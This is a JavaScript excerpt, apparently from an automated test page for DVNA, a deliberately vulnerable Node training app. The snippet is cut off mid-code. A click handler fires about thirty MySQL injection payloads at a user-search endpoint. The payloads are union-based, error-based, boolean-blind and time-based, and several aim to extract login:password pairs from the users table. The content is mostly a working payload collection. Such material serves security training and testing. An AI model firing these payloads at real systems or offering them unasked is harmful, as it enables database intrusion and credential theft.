...
$('#runSQLTest').on('click', function() {
  ...
  $.when(
    sendRequest("test", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' UNION ALL SELECT NULL,version() #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='dvna' #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' UNION ALL SELECT NULL,concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM users #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' UNION ALL SELECT NULL,concat(0x28,login,0x3a,password,0x29) FROM dvna.users #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1))) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME=\"users\" LIMIT 0,1))) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND extractvalue(rand(),concat(0x3a,(SELECT concat(login,0x3a,password) FROM dvna.users LIMIT 0,1))) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"table1\" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT name FROM dvna.users LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT version()),1,1))) > 52 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (SELECT version()) LIKE \"5 %\" #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT name FROM users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND (ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1))) > 95 #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND sleep(10) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF((SELECT version()) LIKE \"5 %\",sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=\"dvna\" LIMIT 0,1),1,1))))> 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\"users\" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF(((ascii(substr((SELECT name FROM users LIMIT 0,1),1,1)))) > 95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("' AND IF(((ascii(substr((SELECT name FROM dvna.users LIMIT 0,1),1,1)))) >95,sleep(10),NULL) #", "/app/usersearch", '#automated_results_xss'),
    sendRequest("'", "/app/usersearch", '#automated_results_xss')
  ).then(function() {
